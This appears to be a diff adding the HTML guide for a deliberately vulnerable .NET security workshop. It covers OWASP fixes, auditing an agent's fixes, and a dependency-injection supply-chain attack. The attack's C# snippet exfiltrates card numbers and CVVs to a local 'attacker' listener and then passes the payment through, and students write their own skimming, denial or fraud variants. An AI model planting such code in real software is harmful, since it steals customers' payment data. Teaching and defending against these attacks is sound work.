+  <span class="tok-s">"orderId"</span>: {{orderId}},
+  <span class="tok-s">"cardNumber"</span>: <span class="tok-s">"4111111111111111"</span>,
+  <span class="tok-s">"cardHolder"</span>: <span class="tok-s">"Max Mustermann"</span>,
+  <span class="tok-s">"cvv"</span>: <span class="tok-s">"999"</span>,
+  <span class="tok-s">"expiryDate"</span>: <span class="tok-s">"06/28"</span>
+}</pre></div>
+    <div class="code"><span class="label">API terminal output</span><button class="copy">Copy</button><pre>info: New user registered: Username=logvictim, <span class="tok-b">Password=meinGeheimesPasswort123!</span>
+info: Payment processed: OrderId=5, <span class="tok-b">Card=4111111111111111, CVV=999</span>, Holder=Max Mustermann</pre></div>
+    <div class="callout danger"><div class="h">🔥 Why it's serious</div>Logs stream to Splunk / ELK / Loki with long retention and broad access. PCI-DSS <b>forbids</b> logging CVV; card numbers must be masked (<code>****1111</code>). Passwords must never be logged — not even hashed.</div>
+    <div class="task" data-id="a09-done"><input type="checkbox"><div class="body"><div class="title">Saw password &amp; card data in the log output</div></div></div>
+
+    <h3 class="q">Audit the agent's fix</h3>
+    <p class="muted">&ldquo;Removed from the log&rdquo; is easy to fake:</p>
+    <div class="task audit" data-id="a09-audit1"><input type="checkbox"><div class="body"><div class="title">Removed everywhere, or just here?</div><div class="desc">Password dropped from one line — but does a <code>{@request}</code> or <code>{@user}</code> elsewhere still serialise the whole object? Card masked but CVV still logged?</div></div></div>
+    <div class="task audit" data-id="a09-audit2"><input type="checkbox"><div class="body"><div class="title">Silenced vs removed</div><div class="desc">Did it drop the log to <code>Debug</code> level (still written, just quieter) instead of removing the secret?</div></div></div>
+    <div class="callout why"><div class="h">🌍 Where else does this hide?</div>Full request/response body logging, <code>Authorization</code> headers in access logs, exception messages that embed secrets, analytics/session-replay capturing form fields, tokens in URLs landing in referer logs. Ask of every log line: "would I be comfortable with this in a third-party log aggregator?"</div>
+  </section>
+
+  <!-- ============ PRESENT ============ -->
+  <section id="present">
+    <div class="sec-head"><h2>3 · Present your fix</h2><span class="owasp">YOUR GROUP</span><span class="time-hint">1:05–1:30 · ~4 min per group</span></div>
+    <p class="sec-sub">Groups present in order, group&nbsp;1 first. About four minutes each, then one question from the presenter.</p>
+    <table>
+      <thead><tr><th>#</th><th>Cover</th><th>Show</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td><b>The problem</b> — in one sentence</td><td>The attack and its status code <i>before</i> the fix</td></tr>
+        <tr><td>2</td><td><b>What the agent did</b></td><td>The diff on screen — not the agent's summary</td></tr>
+        <tr><td>3</td><td><b>Proof</b> that it's fixed</td><td>The same attack re-run (status code <i>after</i>), and your re-scan</td></tr>
+        <tr><td>4</td><td><b>What it missed or broke</b></td><td>Anything from the audit — and what the scan still can't see</td></tr>
+        <tr><td>5</td><td><b>One alternative fix</b></td><td>How else it could be fixed, and why you'd choose it — or not</td></tr>
+      </tbody>
+    </table>
+    <div class="callout why"><div class="h">💡 Point 3 and point 4 carry the talk</div>&ldquo;It's fixed because the agent said so&rdquo; isn't proof — the re-run attack is. And point 4 is where the best presentations are: what the agent got wrong is more interesting than what it got right.</div>
+    <div class="task" data-id="present-done"><input type="checkbox"><div class="body"><div class="title">We presented our fix</div></div></div>
+
+    <div class="callout why"><div class="h">💡 The lesson</div>The agent can tell you what it changed about the <i>code</i>. It can't tell you what it changed about the system's <i>behaviour</i>. That gap — review — is the skill that didn't get automated.</div>
+  </section>
+
+  <!-- ============ CHECKPOINT 1 ============ -->
+  <div class="checkpoint" id="checkpoint1">
+    <span class="flag">◆ Checkpoint 1 · ~1:30 elapsed</span>
+    <h2>End of Part 1 — where you should be</h2>
+    <p class="muted">Every group has presented: what the agent did, how you proved it, and what it missed. Deciding what the agent <i>actually</i> did is the whole point of Part 1 — and you've now seen it for every category, not just your own.</p>
+    <ul class="muted" style="font-size:13.5px">
+      <li><b>App broken after your fixes?</b> Common after A02/A07. Go back to a clean <code>main</code> for Part&nbsp;2 — it only needs the original payment flow.</li>
+      <li><b>Didn't finish your category?</b> That's fine — the presentation was about what you found, not about finishing.</li>
+    </ul>
+
+    <div class="task" data-id="cp1"><input type="checkbox"><div class="body"><div class="title">I've reached Checkpoint 1</div><div class="desc">Every group has presented; my machine is back on a working <code>main</code>.</div></div></div>
+
+    <div class="catchup">
+      <h3 class="q" style="margin-top:0">🎒 Catch-up pack</h3>
+      <p class="muted">On a fresh <code>main</code>, the <a href="#tokens">pre-made tokens in Step&nbsp;0</a> work again — use them to skip the logins in Part&nbsp;2.</p>
+    </div>
+  </div>
+
+  <!-- ============ PART 2 DIVIDER ============ -->
+  <div class="part-divider">
+    <div class="k">Part 2</div>
+    <h2>Supply‑Chain Attack via DI Manipulation</h2>
+    <p>You've been the analyst. Now be the attacker: hijack the payment flow through a single malicious NuGet package — without touching one line of the app's own source.</p>
+  </div>
+
+  <!-- ============ A08 ============ -->
+  <section id="a08">
+    <div class="sec-head"><h2>The attack point: the payment flow</h2><span class="owasp">A08</span><span class="time-hint">~10 min</span></div>
+    <p class="sec-sub">File: <code>Aviato.API/http/06_A08_payment_di_target.http</code></p>
+    <p>First, see the <i>legitimate</i> flow. Log in as <b>alice</b> in the top bar, create an order, then pay for <i>that</i> order. Both requests hit <code>IPaymentService</code>.</p>
+    <div class="code"><span class="label">http · step 1 — create the order</span><button class="copy">Copy</button><pre><span class="tok-c"># The payment below picks up this order's id automatically</span>
+<span class="tok-m">POST</span> <span class="tok-u">http://localhost:5218/orders</span>
+Authorization: Bearer {{aliceToken}}
+Content-Type: application/json
+
+{ <span class="tok-s">"items"</span>: [ { <span class="tok-s">"productId"</span>: 3, <span class="tok-s">"quantity"</span>: 1 }, { <span class="tok-s">"productId"</span>: 4, <span class="tok-s">"quantity"</span>: 2 } ] }</pre></div>
+    <div class="code"><span class="label">http · step 2 — pay for it</span><button class="copy">Copy</button><pre><span class="tok-m">POST</span> <span class="tok-u">http://localhost:5218/payments</span>
+Authorization: Bearer {{aliceToken}}
+Content-Type: application/json
+
+{
+  <span class="tok-s">"orderId"</span>: {{orderId}},
+  <span class="tok-s">"cardNumber"</span>: <span class="tok-s">"4111111111111111"</span>,
+  <span class="tok-s">"cardHolder"</span>: <span class="tok-s">"Alice Mustermann"</span>,
+  <span class="tok-s">"cvv"</span>: <span class="tok-s">"123"</span>,
+  <span class="tok-s">"expiryDate"</span>: <span class="tok-s">"12/27"</span>
+}</pre></div>
+    <p>The endpoint only depends on the <b>interface</b> <code>IPaymentService</code> — it has no idea which concrete class answers. That indirection is the whole vulnerability.</p>
+    <div class="callout warn"><div class="h">⚠ Create the order first</div>Run <b>step 1</b> before <b>step 2</b> — the payment needs a fresh <b>pending</b> order, and <code>{{orderId}}</code> is filled in automatically from the order you just created. This is why a plain re-run works every time: each attempt pays a brand-new order rather than order <code>1</code>, which is already paid. In Part&nbsp;1 this succeeds against the real <code>PaymentService</code> with <b>no listener required</b>; the malicious override only comes in 2.1.</div>
+    <div class="task" data-id="a08-done"><input type="checkbox"><div class="body"><div class="title">Ran a legitimate payment through IPaymentService</div></div></div>
+  </section>
+
+  <!-- ============ DI CONCEPT ============ -->
+  <section id="di-concept">
+    <div class="sec-head"><h2>2.1 · How the override works</h2><span class="time-hint">~15 min</span></div>
+    <p class="sec-sub">.NET's DI container keeps <b>the last registration</b> for an interface. Register a second implementation after the real one and it silently wins.</p>
+    <div class="code"><span class="label">csharp · Program.cs</span><button class="copy">Copy</button><pre><span class="tok-c">// legitimate registration — always on</span>
+builder.Services.AddScoped&lt;IPaymentService, PaymentService&gt;();
+
+<span class="tok-c">// Workshop switch: the package is only wired in for Part 2.</span>
+<span class="tok-c">//   dotnet run --project Aviato.API --launch-profile http-part2</span>
+<span class="tok-b">if</span> (builder.Configuration.GetValue&lt;<span class="tok-b">bool</span>&gt;(<span class="tok-s">"Workshop:EnablePart2"</span>))
+{
+    builder.Services.AddNugetPackageServices();
+    <span class="tok-c">//   └─ services.AddScoped&lt;IPaymentService, MaliciousPaymentService&gt;();</span>
+    <span class="tok-c">// → last registration wins. PaymentService is silently replaced.</span>
+}</pre></div>
+    <p>In <b>Part&nbsp;1</b> the override is switched off, so the real <code>PaymentService</code> answers every payment. For <b>Part&nbsp;2</b> we flip one flag (a config switch that simulates "the developer added the package") and the same request is silently answered by <code>Aviato.Dependencies/MaliciousPaymentService.cs</code>, which exfiltrates the card data and then <b>calls the real service</b> so the user notices nothing (a "pass-through"):</p>
+    <div class="code"><span class="label">csharp · MaliciousPaymentService</span><button class="copy">Copy</button><pre><span class="tok-c">// 1. exfiltrate to the attacker's server</span>
+await client.PostAsJsonAsync(
+    <span class="tok-b">"http://localhost:5030/malicious-endpoint"</span>, request);
+
+<span class="tok-c">// 2. pass through to the real service — nothing looks wrong</span>
+var legit = serviceProvider.GetServices&lt;IPaymentService&gt;()
+    .First(s =&gt; s is not MaliciousPaymentService);
+return await legit.ProcessPaymentAsync(request);</pre></div>
+
+    <h3 class="q">See it live</h3>
+    <ol>
+      <li>Stop the API and restart it with the malicious override enabled. (Part&nbsp;1 ran the legitimate service; this is the moment the "package" takes over.)</li>
+    </ol>
+    <div class="code"><span class="label">bash · terminal 1</span><button class="copy">Copy</button><pre>dotnet run --project Aviato.API --launch-profile http-part2</pre></div>
+    <p class="muted" style="font-size:13px">Equivalent: <code>Workshop__EnablePart2=true dotnet run --project Aviato.API</code>. Without the override a plain restart keeps the real <code>PaymentService</code>.</p>
+    <div class="code"><span class="label">bash · dev container (alternative)</span><button class="copy">Copy</button><pre><span class="tok-c"># Restarts the supervised API in the dev container with the Part 2 override</span>
+bash .devcontainer/start-launch.sh part2</pre></div>
+    <div class="callout warn"><div class="h">⚠ VS Code</div>In VS&nbsp;Code, open the Command Palette, choose <b>Tasks: Run Task</b>, then <b>Start launch config</b>, and pick <b>Aviato.API · Part 2 (malicious override)</b>. That restarts the API already running in the dev container with the Part&nbsp;2 override on.</div>
+    <ol start="2">
+      <li>Start the attacker's listener in <b>Terminal 2</b>:</li>
+    </ol>
+    <div class="code"><span class="label">bash · terminal 2</span><button class="copy">Copy</button><pre>dotnet run --project MaliciousListener</pre></div>
+    <div class="code"><span class="label">bash · dev container (alternative)</span><button class="copy">Copy</button><pre><span class="tok-c"># Starts the listener alongside the API (it binds :5030, so the API keeps running)</span>
+bash .devcontainer/start-launch.sh listener</pre></div>
+    <p>It listens on <code>http://localhost:5030</code>.</p>
+    <div class="callout warn"><div class="h">⚠ Before you re-run — check both are up</div>The capture only works when <b>both</b> of these are running:<ul><li>the API restarted with the <b>Part 2 launch config</b> (<code>http-part2</code> / <i>Aviato.API · Part 2 (malicious override)</i>) — not the plain Part 1 profile, or the real <code>PaymentService</code> still answers and nothing is stolen;</li><li>the <b>malicious listener</b> running in a <b>separate terminal</b> (<code>dotnet run --project MaliciousListener</code>) — or the exfiltration call has nowhere to land.</li></ul></div>
+    <p>Now re-run the A08 flow — <b>step 1</b> to create a fresh pending order, then <b>step 2</b> to pay — and watch the listener's console print the full card number and CVV. Same requests, same 200 OK — but the data has been stolen in transit.</p>
+    <div class="task" data-id="di-done"><input type="checkbox"><div class="body"><div class="title">Watched the malicious listener capture the card data</div></div></div>
+  </section>
+
+  <!-- ============ GROUP TASK ============ -->
+  <section id="group-task">
+    <div class="sec-head"><h2>2.2 · Group exercise</h2><span class="time-hint">~35 min</span></div>
+    <p class="sec-sub">Each group implements its own attack strategy inside <code>MaliciousPaymentService.ProcessPaymentAsync</code>, then presents it. The endpoint and client stay identical — that's the point.</p>
+
+    <div class="card">
+      <h3 class="q" style="margin-top:0">Choose a strategy</h3>
+      <table>
+        <thead><tr><th>Strategy</th><th>Behaviour</th><th>Real-world analogue</th></tr></thead>
+        <tbody>
+          <tr><td><b>Exfiltration</b></td><td>POST card data to an external server, then pass through</td><td>Magecart / card skimming</td></tr>
+          <tr><td><b>Denial</b></td><td>Always return "payment failed" — a working DoS</td><td>Sabotage / extortion</td></tr>
+          <tr><td><b>Silent fraud</b></td><td>Charge the card but never set the order to <code>paid</code></td><td>Invisible theft</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="task" data-id="gt-1"><input type="checkbox"><div class="body"><div class="title">Pick a strategy &amp; implement it in MaliciousPaymentService</div></div></div>
+    <div class="task" data-id="gt-2"><input type="checkbox"><div class="body"><div class="title">Run a payment and prove your attack worked</div><div class="desc">Listener output, an unchanged order status, or a forced failure — depending on your strategy.</div></div></div>
+    <div class="task" data-id="gt-3"><input type="checkbox"><div class="body"><div class="title">Present to the room: what changed for the victim? What didn't?</div></div></div>
+
+    <div class="callout warn"><div class="h">🧭 Discussion prompt</div>From the outside — client, network, response codes — could the victim tell the difference between your malicious build and the legitimate one? What would they need to inspect to notice?</div>
+  </section>
+
+  <!-- ============ DEFENSES ============ -->
+  <section id="defenses">
+    <div class="sec-head"><h2>2.3 · Detection &amp; defense</h2><span class="time-hint">~20 min</span></div>
+    <p class="sec-sub">A single dependency changed everything and left no trace in your code. Here's how you'd catch and prevent it.</p>
+    <table>
+      <thead><tr><th>Control</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td><b>NuGet package signing</b></td><td>Only install packages signed by a trusted certificate; verify signatures on restore.</td></tr>
+        <tr><td><b>Lock files</b></td><td>Commit <code>packages.lock.json</code> + <code>RestorePackagesWithLockFile=true</code> so dependencies can't shift silently.</td></tr>
+        <tr><td><b>Deterministic / reproducible builds</b></td><td>Same source → bit-identical artifact, so tampering is detectable.</td></tr>
+        <tr><td><b>Dependency review in CI</b></td><td>GitHub Dependency Review Action flags new/changed packages on every PR.</td></tr>
+        <tr><td><b>Validate the DI container at startup</b></td><td>Assert every resolved service type against a whitelist — fail fast if <code>IPaymentService</code> isn't <code>PaymentService</code>.</td></tr>
+        <tr><td><b>Source mapping / provenance</b></td><td>Match the package hash to verified source; prefer SLSA / signed provenance.</td></tr>
+      </tbody>
+    </table>
+    <details class="reveal"><summary>Startup guard — concrete example</summary><div class="inner"><div class="code"><span class="label">csharp</span><button class="copy">Copy</button><pre><span class="tok-b">var</span> impl = app.Services.GetRequiredService&lt;IPaymentService&gt;().GetType();
+<span class="tok-b">if</span> (impl != <span class="tok-b">typeof</span>(PaymentService))
+    <span class="tok-b">throw new</span> InvalidOperationException(
+        <span class="tok-s">$"Unexpected IPaymentService: {impl.FullName}"</span>);</pre></div></div></details>
+    <div class="task" data-id="def-done"><input type="checkbox"><div class="body"><div class="title">Discussed at least three concrete countermeasures</div></div></div>
+  </section>
+
+  <!-- ============ WRAP UP ============ -->
+  <div class="checkpoint" id="wrap">
+    <span class="flag">◆ Wrap-up · 3:00</span>
+    <h2>You made it</h2>
+    <p class="muted">You reproduced seven OWASP Top 10 categories in a real codebase, automated the hunt with Semgrep, and executed + defended a supply-chain attack that never touched the victim's source.</p>
+    <ul>
+      <li><b>Part 1:</b> vulnerabilities are concrete, findable, and fixable — and a scanner catches most of them in CI.</li>
+      <li><b>Part 2:</b> your dependencies run with your privileges. Trust, but verify — signing, lock files, and startup validation.</li>
+    </ul>
+    <div class="task" data-id="wrap"><input type="checkbox"><div class="body"><div class="title">Workshop complete 🎉</div></div></div>
+  </div>
+
+  <!-- ============ REFERENCE ============ -->
+  <section id="reference">
+    <div class="sec-head"><h2>★ Cheat sheet</h2></div>
+    <div class="card">
+      <h3 class="q" style="margin-top:0">Endpoints &amp; ports</h3>
+      <table>
+        <tbody>
+          <tr><td>Aviato API</td><td><code>http://localhost:5218</code></td></tr>
+          <tr><td>Reset application</td><td>Sidebar button — restarts the API and clears Run responses</td></tr>
+          <tr><td>Malicious listener (Part 2)</td><td><code>http://localhost:5030</code></td></tr>
+          <tr><td>Enable the Part&nbsp;2 override</td><td><code>dotnet run --project Aviato.API --launch-profile http-part2</code></td></tr>
+          <tr><td>JWT secret</td><td><code>aviato-jwt-signing-key-2024-prod!</code></td></tr>
+          <tr><td>MD5 of <code>hunter2</code></td><td><code>2ab96390c7dbe3439de74d0c9b0b1767</code></td></tr>
+        </tbody>
+      </table>
+      <h3 class="q">Key request routes</h3>
+      <table>
+        <tbody>
+          <tr><td><span class="pill post">POST</span></td><td><code>/auth/login</code>, <code>/auth/register</code>, <code>/orders</code>, <code>/payments</code></td></tr>
+          <tr><td><span class="pill get">GET</span></td><td><code>/orders/{id}</code>, <code>/orders/my</code>, <code>/admin/users</code>, <code>/products/search?q=</code>, <code>/debug/config</code></td></tr>
+        </tbody>
+      </table>
+      <h3 class="q">The 8 .http files (in <code>Aviato.API/http/</code>)</h3>
+      <p class="muted" style="font-size:13px"><code>00_setup</code> · <code>01_A01_broken_access_control</code> · <code>02_A02_cryptographic_failures</code> · <code>03_A03_sql_injection</code> · <code>04_A05_security_misconfiguration</code> · <code>05_A07_auth_failures</code> · <code>06_A08_payment_di_target</code> · <code>07_A09_sensitive_logging</code></p>
+    </div>
+  </section>
+
+  <div class="footer">
+    Code-Blooded · .NET Security Forensic Lab — deliberately vulnerable teaching lab. All targets run locally on your own machine. Progress is stored only in this browser (localStorage).
+  </div>
+</main>
+</div>
+
+<script>
+(function(){
+  "use strict";
+  var STORE_KEY="aviato-ws-progress-v1", TIMER_KEY="aviato-ws-timer-v1";
+
+  /* ---------- progress ---------- */
+  var boxes=[].slice.call(document.querySelectorAll('.task input[type=checkbox]'));
+  var saved={};
+  try{ saved=JSON.parse(localStorage.getItem(STORE_KEY)||"{}"); }catch(e){}
+
+  function taskId(el){ return el.closest('.task').getAttribute('data-id'); }
+  function persist(){
+    var s={};
+    boxes.forEach(function(b){ s[taskId(b)]=b.checked; });
+    try{ localStorage.setItem(STORE_KEY, JSON.stringify(s)); }catch(e){}
+  }
+  /* with a group picked, other groups' briefs don't count towards progress */
+  function counted(b){ return !b.closest('section.brief.theirs'); }
+  function updateProgress(){
+    var mine=boxes.filter(counted);
+    var done=mine.filter(function(b){return b.checked;}).length;
+    var total=mine.length;
+    document.getElementById('pbarFill').style.width=(total?done/total*100:0)+'%';
+    document.getElementById('pcount').textContent=done+' / '+total+' done';
+    boxes.forEach(function(b){ b.closest('.task').classList.toggle('checked', b.checked); });
+    updateNavTicks();
+  }
+  boxes.forEach(function(b){
+    if(saved[taskId(b)]) b.checked=true;
+    b.addEventListener('change', function(){ persist(); updateProgress(); });
+  });
+  // click anywhere on the task row toggles (but not when selecting text/links)
+  [].slice.call(document.querySelectorAll('.task')).forEach(function(row){
+    row.addEventListener('click', function(e){
+      if(e.target.tagName==='A') return;
+      if(e.target.tagName!=='INPUT'){
+        var cb=row.querySelector('input'); cb.checked=!cb.checked;
+        cb.dispatchEvent(new Event('change'));
+      }
+    });
+  });
+
+  /* ---------- nav ticks: mark a section done when its tasks are all checked ---------- */
+  function updateNavTicks(){
+    [].slice.call(document.querySelectorAll('#nav a[data-sec]')).forEach(function(a){
+      var sec=document.getElementById(a.getAttribute('data-sec'));
+      if(!sec) return;
+      var t=[].slice.call(sec.querySelectorAll('.task input'));
+      var link=a;
+      if(t.length && t.every(function(x){return x.checked;})){
+        link.classList.add('done'); link.querySelector('.tick').textContent='✓';
+      }else{
+        link.classList.remove('done'); link.querySelector('.tick').textContent='';
+      }
+    });
+  }
+
+  /* ---------- reset (two-click confirm; native confirm() is blocked in some sandboxes) ---------- */
+  var resetBtn=document.getElementById('resetBtn'), resetLabel=resetBtn.textContent, resetArmed=false, resetT=null;
+  resetBtn.addEventListener('click', function(){
+    if(!resetArmed){
+      resetArmed=true; resetBtn.textContent='Click again to confirm';
+      resetT=setTimeout(function(){ resetArmed=false; resetBtn.textContent=resetLabel; }, 3000);
+      return;
+    }
+    clearTimeout(resetT); resetArmed=false; resetBtn.textContent=resetLabel;
+    try{ localStorage.removeItem(STORE_KEY); localStorage.removeItem(TIMER_KEY); localStorage.removeItem('aviato-group-v1');}catch(e){}
+    boxes.forEach(function(b){b.checked=false;});
+    timerStart=null; render();
+    group={layout:'4', n:null}; renderGroup();
+  });
+
+  /* ---------- copy buttons ---------- */
+  [].slice.call(document.querySelectorAll('.code .copy')).forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var pre=btn.parentNode.querySelector('pre');
+      var text=pre.innerText;
+      navigator.clipboard.writeText(text).then(function(){
+        var old=btn.textContent; btn.textContent='Copied ✓'; btn.classList.add('ok');
+        setTimeout(function(){ btn.textContent=old; btn.classList.remove('ok'); },1400);
+      });
+    });
+  });
+
+  /* ---------- runnable requests ----------
+     Every "http" code block gets a Run button. The request is parsed out of the
+     <pre> itself, {{…}} placeholders are filled from the session bar, and the
+     response is rendered underneath. This only works because the API answers
+     with Access-Control-Allow-Origin: * — which *is* the A05 finding. Once the
+     wildcard is replaced by an allow-list these buttons stop working, so the
+     failure path says so rather than looking like a bug. */
+  var BASE_KEY='aviato_base', TOK_KEY='aviato_session', DEFAULT_BASE='http://localhost:5218';
+  var USERS=['alice','bob','admin'], SEED={alice:'password', bob:'password', admin:'admin123'};
+  /* one identity at a time: {user, token} — switching users replaces it */
+  var session={};
+  try{ session=JSON.parse(localStorage.getItem(TOK_KEY)||'{}')||{}; }catch(e){ session={}; }
+  var baseInput=document.getElementById('baseUrl');
+  try{ var savedBase=localStorage.getItem(BASE_KEY); if(savedBase) baseInput.value=savedBase; }catch(e){}
+  function base(){ return (baseInput.value||DEFAULT_BASE).trim().replace(/\/+$/,''); }
+  baseInput.addEventListener('change', function(){ try{localStorage.setItem(BASE_KEY, base());}catch(e){} });
+
+  function saveSession(){ try{localStorage.setItem(TOK_KEY, JSON.stringify(session));}catch(e){} renderSession(); }
+  function renderSession(){
+    var chip=document.getElementById('whoChip');
+    chip.className='tokchip'+(session.token?' have':'');
+    chip.textContent=session.token ? 'signed in as '+session.user+' · token …'+session.token.slice(-10) : 'not logged in';
+    [].slice.call(document.querySelectorAll('#authbar label')).forEach(function(l){
+      var input=l.querySelector('input'), on=!!session.token && input.value===session.user;
+      l.classList.toggle('on', on);
+      if(input.checked!==on) input.checked=on;
+    });
+    document.getElementById('logoutBtn').disabled=!session.token;
+  }
+  /* {{aliceToken}} resolves only while alice is the one logged in.
+     {{orderId}} is the id from the last successful POST /orders on this page. */
+  var lastOrderId=null;
+  function fill(text){
+    var out=text.replace(/\{\{(\w+)Token\}\}/g, function(m,u){
+      return (session.token && u===session.user) ? session.token : m;
+    });
+    if(lastOrderId!=null) out=out.replace(/\{\{orderId\}\}/g, String(lastOrderId));
+    return out;
+  }
+  function captureOrder(req, res, txt){
+    if(req.method!=='POST' || !/\/orders\/?$/.test(req.url||'') || res.status>=300) return;
+    try{
+      var id=JSON.parse(txt).id;
+      if(typeof id==='number') lastOrderId=id;
+    }catch(e){}
+  }
+
+  /* METHOD url / headers until a blank line / everything after it is the body */
+  function parseRequest(text){
+    var lines=text.split('\n'), i=0, req={headers:{}};
+    while(i<lines.length && (!lines[i].trim() || lines[i].trim().charAt(0)==='#')) i++;
+    var m=/^([A-Z]+)\s+(\S.*)$/.exec((lines[i]||'').trim());
+    if(!m) return null;
+    req.method=m[1]; req.url=m[2].trim(); i++;
+    for(; i<lines.length; i++){
+      var l=lines[i];
+      if(!l.trim()){ i++; break; }
+      if(l.trim().charAt(0)==='#') continue;
+      var h=/^([A-Za-z0-9-]+):\s*(.*)$/.exec(l.trim());
+      if(!h) break;
+      req.headers[h[1]]=h[2];
+    }
+    var body=lines.slice(i).join('\n').trim();
+    if(body) req.body=body;
+    return req;
+  }
+
+  function show(panel, cls, status, meta, body, note){
+    panel.hidden=false; panel.innerHTML='';
+    var st=document.createElement('div'); st.className='st';
+    var sc=document.createElement('span'); sc.className='sc '+cls; sc.textContent=status; st.appendChild(sc);
+    if(meta){ var mt=document.createElement('span'); mt.className='meta'; mt.textContent=meta; st.appendChild(mt); }
+    panel.appendChild(st);
+    if(body){ var pre=document.createElement('pre'); pre.textContent=body; panel.appendChild(pre); }
+    if(note){ var n=document.createElement('div'); n.className='note'; n.innerHTML=note; panel.appendChild(n); }
+  }
+  function pretty(t){ try{ return JSON.stringify(JSON.parse(t), null, 2); }catch(e){ return t; } }
+  function clip(t){ return t.length>4000 ? t.slice(0,4000)+'\n… (truncated)' : t; }
+
+  function send(req, panel, after){
+    var t0=Date.now();
+    var init={method:req.method, headers:req.headers||{}, mode:'cors', cache:'no-store'};
+    if(req.body && req.method!=='GET' && req.method!=='HEAD') init.body=req.body;
+    show(panel,'err','…', req.method+' '+req.url, null);
+    return fetch(req.url, init).then(function(res){
+      return res.text().then(function(txt){
+        show(panel, res.status<300?'ok':'bad', res.status+' '+(res.statusText||''),
+             req.method+' '+req.url+' · '+(Date.now()-t0)+' ms',
+             clip(pretty(txt)));
+        if(after) after(res, txt);
+      });
+    })['catch'](function(err){
+      show(panel,'err','Request failed', req.method+' '+req.url, String((err&&err.message)||err),
+        'Either the API is not running on <code>'+base()+'</code>, or the browser refused the call. '+
+        'These buttons rely on the CORS wildcard from A05 — once that is narrowed to an allow-list, this page becomes exactly the "any website" that gets turned away. '+
+        'If the API is up and this still fails, serve the guide over http (<code>python3 -m http.server</code>) instead of opening the file directly.');
+    });
+  }
+
+  /* a login response carries a token — it becomes THE session, replacing any other */
+  function captureToken(reqBody, txt){
+    var tok=null, user=null;
+    try{ tok=JSON.parse(txt).token; }catch(e){}
+    if(!tok) return;
+    try{ user=JSON.parse(reqBody||'{}').username; }catch(e){}
+    if(!user) return;
+    session={user:user, token:tok}; saveSession();
+  }
+
+  [].slice.call(document.querySelectorAll('.code')).forEach(function(block){
+    var label=block.querySelector('.label'), pre=block.querySelector('pre');
+    if(!label || !pre || label.textContent.trim().toLowerCase().indexOf('http')!==0) return;
+    var probe=parseRequest(pre.textContent);
+    if(!probe) return;
+
+    var btn=document.createElement('button');
+    btn.className='run'; btn.type='button'; btn.textContent='Run';
+    block.appendChild(btn);
+
+    if(probe.method==='OPTIONS'){
+      btn.disabled=true;
+      btn.title='A page cannot send its own preflight: Origin and Access-Control-Request-* are headers only the browser may set. Run this one from the .http file.';
+      return;
+    }
+
+    var panel=document.createElement('div');
+    panel.className='resp'; panel.hidden=true;
+    block.appendChild(panel);
+
+    btn.addEventListener('click', function(){
+      var filled=fill(pre.textContent);
+      var miss=/\{\{(\w+)Token\}\}/.exec(filled);
+      if(miss){
+        show(panel,'err','Needs '+miss[1]+"'s token", null, null,
+             session.token
+               ? 'You are logged in as <b>'+session.user+'</b>. Switch to <b>'+miss[1]+'</b> in the top bar, then press Run again.'
+               : 'Pick <b>'+miss[1]+'</b> in the top bar to log in, then press Run again.');
+        return;
+      }
+      if(/\{\{orderId\}\}/.test(filled)){
+        show(panel,'err','Needs an order id', null, null,
+             'Run the order request above first — logged in as <b>alice</b> — then press Run again. The id from that response is filled in here.');
+        return;
+      }
+      var req=parseRequest(filled);
+      req.url=req.url.replace(/^https?:\/\/localhost:5218/, base());
+      btn.classList.add('busy'); btn.textContent='Running…';
+      send(req, panel, function(res, txt){ captureToken(req.body, txt); captureOrder(req, res, txt); }).then(function(){
+        btn.classList.remove('busy'); btn.textContent='Run';
+      });
+    });
+  });
+
+  /* A03 payloads live in a table, not a code block — one shared output panel */
+  var a03out=document.getElementById('a03out');
+  [].slice.call(document.querySelectorAll('.run-inline')).forEach(function(b){
+    var armed=false, armT=null;
+    b.addEventListener('click', function(){
+      if(b.getAttribute('data-danger') && !armed){
+        armed=true; b.textContent='Confirm — this empties the table';
+        armT=setTimeout(function(){ armed=false; b.textContent='Run'; }, 3000);
+        return;
+      }
+      clearTimeout(armT); armed=false;
+      b.classList.add('busy'); b.textContent='Running…';
+      send({method:'GET', headers:{}, url:base()+'/products/search?q='+encodeURIComponent(b.getAttribute('data-search'))}, a03out)
+        .then(function(){ b.classList.remove('busy'); b.textContent='Run'; });
+    });
+  });
+
+  /* identity switch: logging in as somebody logs the previous somebody out */
+  var sessionOut=document.getElementById('sessionOut');
+  function login(user, label){
+    var body=JSON.stringify({username:user, password:SEED[user]});
+    if(label){ label.classList.add('busy'); label.classList.remove('fail'); label.title=''; }
+    return send({method:'POST', url:base()+'/auth/login', headers:{'Content-Type':'application/json'}, body:body},
+                sessionOut, function(res, txt){ captureToken(body, txt); })
+      .then(function(){
+        if(!label) return;
+        label.classList.remove('busy');
+        if(session.user!==user){
+          label.classList.add('fail');
+          label.title='Login failed — is the API running on '+base()+'? Full response in Step 0.';
+          renderSession();
+        }
+      });
+  }
+  [].slice.call(document.querySelectorAll('#authbar label')).forEach(function(label){
+    label.querySelector('input').addEventListener('change', function(){
+      login(this.value, label);
+    });
+  });
+  function logout(){ session={}; saveSession(); sessionOut.hidden=true; }
+  document.getElementById('logoutBtn').addEventListener('click', logout);
+  document.getElementById('clearTokens').addEventListener('click', logout);
+  renderSession();
+
+  /* Restart the API (re-seeds the in-memory database) and drop Run responses. */
+  var resetAppBtn=document.getElementById('resetAppBtn');
+  var resetAppLabel=resetAppBtn.textContent, resetAppTitle=resetAppBtn.title;
+  var resetAppArmed=false, resetAppT=null, resetAppBusy=false;
+  function delay(ms){ return new Promise(function(resolve){ setTimeout(resolve, ms); }); }
+  function clearApiCalls(){
+    [].slice.call(document.querySelectorAll('.resp')).forEach(function(panel){
+      panel.hidden=true; panel.innerHTML='';
+    });
+    [].slice.call(document.querySelectorAll('.code .run, .run-inline')).forEach(function(b){
+      b.classList.remove('busy');
+      if(!b.disabled) b.textContent='Run';
+    });
+  }
+  function readInstance(){
+    return fetch(base()+'/workshop/health', {cache:'no-store', mode:'cors'}).then(function(res){
+      if(!res.ok) throw new Error('health '+res.status);
+      return res.json();
+    }).then(function(body){ return body && body.instanceId; });
+  }
+  function waitForRestart(previous){
+    var started=Date.now();
+    function poll(){
+      if(Date.now()-started>60000) return Promise.reject(new Error('timeout'));
+      return readInstance().then(function(id){
+        if(id && id!==previous) return id;
+        return delay(400).then(poll);
